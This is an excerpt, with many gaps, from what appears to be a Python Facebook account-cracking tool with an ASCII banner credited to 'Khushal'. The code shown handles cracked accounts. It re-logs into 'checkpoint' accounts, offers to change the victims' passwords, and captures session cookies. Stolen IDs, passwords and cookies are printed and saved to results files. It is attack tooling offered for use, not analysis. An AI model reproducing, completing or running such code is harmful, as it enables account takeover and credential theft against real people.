...
# LOGO
def logo():
    prints(Panel(f"""                  YUSEP GANZ AKU CINTA INDONESIA {M2}
███████████████████████████████████████████████████████████████████
███████████████████████████████████████████████████████████████████
███████████████████████████████████████████████████████████████████
{P2}███████████████████████████████████████████████████████████████████
...
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print(f'\n%s══════════════════════════════════════════\n [%s✓%s] %sCracking By Khushal Usercrack...\n%s══════════════════════════════════════════'%(N,H,N,H,N))
        ...
        if cek_cp =="":
            ...
            if ww in ("Y","y","ya"):
                ubahP.append("y")
                print(f" {N}[{H}•{N}] Password example : {H}khushal123{N}")
            ...
            for memek in cp:
                ...
                titid  = kontol.split(' • ')
                print(f'{N}══════════════════════════════════════════\n {H}LOGIN PROCESS')
                jalan(f' {N}[{M}?{N}] Account : {K}{kontol.replace("[KHUSHAL-CP] ", "")}{N}')
                try:
                    log_hasil(titid[0].replace("[KHUSHAL-CP] ", ""), titid[1])
          ...
          #      ua1 = random.choice(agen1)
               # ua2 = random.choice(agen2)
                ...
                if "c_user" in session.cookies.get_dict():
                    ...
                    print("\n");YayanGanteng = f'[•] ID/NOMOR : {user}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {coki}'
                    Kiya=nel(YayanGanteng,style='green');cetak(nel(Kiya,title='• BERHASIL •'))
                    wrt = ' [✓] %s • %s' % (user,pw)
                    ok.append(wrt)
                    ...
                    try:
                        ...
                        Kiya=nel(YayanGanteng,style='yellow');cetak(nel(Kiya,title='• CHECKPOIN •'))
                    ...
                    print("\n");YayanGanteng = f'[•] ID/NOMOR : {user}\n[•] PASSWORD : {pw}'
                    Kiya=nel(YayanGanteng,style='red');cetak(nel(Kiya,title='• CHECKPOIN •'))
                    wrt = ' [×] %s|%s' % (user,pw)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
